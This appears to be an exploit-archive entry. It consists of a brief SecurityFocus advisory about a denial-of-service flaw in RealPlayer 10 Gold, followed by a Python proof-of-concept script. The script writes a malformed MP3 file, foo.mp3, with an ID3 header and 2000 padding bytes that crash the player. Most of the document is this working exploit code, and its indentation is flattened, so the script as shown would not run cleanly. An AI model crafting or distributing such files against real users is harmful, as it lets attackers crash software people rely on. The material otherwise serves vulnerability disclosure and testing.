source: http://www.securityfocus.com/bid/34719/info

RealNetworks RealPlayer is prone to a remote denial-of-service vulnerability because the application fails to handle specially crafted files.

Exploiting this issue allows remote attackers to crash the application, denying further service to legitimate users.

RealPlayer 10 Gold is vulnerable; other versions may also be affected. 

#!/usr/bin/python

import sys,os

#RealPlayer MP3 DoS PoC by AbdulAziz Hariri - ahariri@insight-tech.org

mp3_file = 
("\x49\x44\x33\x00\x00\x00\x00\x00\x09\x07\x41\x41\x41\x41\x00\x00\x00\x08\x00\x00\x00"+
"\x50\x69\x73\x74\x65\x20\x35\x54\x50\x45\x31\x00\x00\x00\x05\x00\x00\x00\x41\x6e"+
"\x69\x73\x54\x41\x4c\x42\x00\x00\x00\x0d\x00\x00\x00\x41\x41\x41\x41"+
"\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
+ "\x41"*2000)

try:
f = open("foo.mp3","w")
try:
f.write(mp3_file)
finally:
f.close()
except IOError:
pass

print "[x] Try loading foo.mp3"

